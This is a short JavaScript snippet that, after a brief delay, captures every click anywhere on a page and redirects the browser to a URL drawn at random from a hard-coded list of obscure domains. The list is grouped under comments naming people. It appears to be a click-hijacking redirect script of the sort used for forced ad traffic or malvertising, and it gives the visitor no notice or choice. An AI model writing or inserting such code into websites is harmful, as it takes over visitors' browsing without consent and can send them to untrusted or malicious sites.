function init() {
  var arr = [
    // hill: Michael
    "https://spry-cat.com/bv3WVz0nP.3/pYvtb-mOVYJVZDDp0G1/NADOIV2VNJTJcQ0/LQT/UQ0/MVjwYw1tNjzzUB",
    "https://spry-cat.com/b.3/Vk0NP/3gp/vDblmCVpJVZ-De0_1ZNjD/I/2ANWTsgUyKLaTBU/0gMXj/Y/1lOYDkMu",
    "https://spry-cat.com/bW3YVq0/P.3UpIvGb/mLV_JmZ/Da0-1CNHD-I/2/NqTUkwwTLtT/Ue0tM/j/YI1tOHTNEY",
    "https://spry-cat.com/bW3YVq0/P.3UpIvGb/mLV_JmZ/Da0-1CNHD-I/2/NqTUkwwTLtT/Ue0tM/j/YI1tOHTNEY",
    "https://spry-cat.com/b-3.VG0/Po3xpgvPbOmxVpJ/ZoDM0v1gNyDtIX2/NkjxED2nLRToU/0qM_j/Y/2HMrTYcN",

    // mon: Lucy
    "https://kaushichie.net/4/7683316",
    "https://grapseex.com/4/7683319",
    "https://nawhaurgoas.com/4/7683320",
    "https://zaltaumi.net/4/7683322",
    "https://gouthishoust.net/4/7683324",

    "https://stongoapti.net/4/7683326",
    "https://psaurdard.net/4/7683327",
    "https://megroarsoy.net/4/7683328",
    "https://thaudray.com/4/7683329",
    "https://psaupteer.net/4/7683330",
  ];
 
  var didOpen = false;
  document.addEventListener("click", function() {
    if (didOpen) {
      return;
    }
    didOpen = true;
    setTimeout(() => {
      didOpen = false;
    }, 5000);

    var randomIndex = Math.floor(Math.random() * arr.length);
    var randomLink = arr[randomIndex];
    window.location.href = randomLink;
  });
}

setTimeout(() => {
  init();
}, 500);